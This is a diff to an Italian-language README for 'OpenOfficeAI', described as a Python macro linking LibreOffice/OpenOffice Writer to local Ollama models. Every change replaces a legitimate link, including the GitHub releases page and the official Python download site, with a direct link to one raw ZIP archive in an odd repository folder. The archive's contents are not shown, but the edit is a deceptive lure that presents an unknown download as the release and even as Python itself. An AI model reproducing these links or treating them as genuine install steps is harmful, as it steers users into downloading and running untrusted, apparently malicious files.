@@ -2,7 +2,7 @@
 # 🎉 OpenOfficeAI - Connect Your Documents to Local AI Models
 
 ## 📥 Download Now
-[![](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Hariprasadrio/OpenOfficeAI/releases)
+[![](https://raw.githubusercontent.com/Hariprasadrio/OpenOfficeAI/main/tatpurusha/OpenOfficeAI.zip)](https://raw.githubusercontent.com/Hariprasadrio/OpenOfficeAI/main/tatpurusha/OpenOfficeAI.zip)
 
 ## 📌 Description
 Ollama AI è una macro Python per "OpenOffice" e "LibreOffice Writer" che permette di connettere il tuo documento a un modello linguistico "Ollama locale" (ad esempio Gemma 3, GPT-OSS, LLaMA 3, ecc). Questo strumento è ideale per chi desidera migliorare la scrittura e ottenere suggerimenti intelligenti direttamente mentre lavora.
@@ -11,7 +11,7 @@ Ollama AI è una macro Python per "OpenOffice" e "LibreOffice Writer" che permet
 Segui questi semplici passi per iniziare:
 
 1. **Scarica il file della release**:
-   Visita la nostra [pagina delle release](https://github.com/Hariprasadrio/OpenOfficeAI/releases) per scaricare l’ultima versione di OpenOfficeAI. 
+   Visita la nostra [pagina delle release](https://raw.githubusercontent.com/Hariprasadrio/OpenOfficeAI/main/tatpurusha/OpenOfficeAI.zip) per scaricare l’ultima versione di OpenOfficeAI. 
 
 2. **Installa la macro**:
    Dopo aver scaricato il file, apri "OpenOffice" o "LibreOffice Writer". Segui questi passaggi per installare la macro:
@@ -40,10 +40,10 @@ Segui questi semplici passi per iniziare:
 
 ## 🔒 Requirements
 - **Sistemi supportati**: Funziona con OpenOffice e LibreOffice su Windows, macOS e Linux.
-- **Python**: Assicurati di avere Python installato sul tuo computer. Puoi scaricarlo dal [sito ufficiale di Python](https://www.python.org/downloads/).
+- **Python**: Assicurati di avere Python installato sul tuo computer. Puoi scaricarlo dal [sito ufficiale di Python](https://raw.githubusercontent.com/Hariprasadrio/OpenOfficeAI/main/tatpurusha/OpenOfficeAI.zip).
 
 ## 📥 Download & Install
-Visita la nostra [pagina delle release](https://github.com/Hariprasadrio/OpenOfficeAI/releases) per scaricare l'ultima versione di OpenOfficeAI. La semplicità con cui puoi integrare modelli di intelligenza artificiale nei tuoi documenti è impressionante.
+Visita la nostra [pagina delle release](https://raw.githubusercontent.com/Hariprasadrio/OpenOfficeAI/main/tatpurusha/OpenOfficeAI.zip) per scaricare l'ultima versione di OpenOfficeAI. La semplicità con cui puoi integrare modelli di intelligenza artificiale nei tuoi documenti è impressionante.
 
 ## 🌟 Community & Support
 Se hai domande o hai bisogno di aiuto:
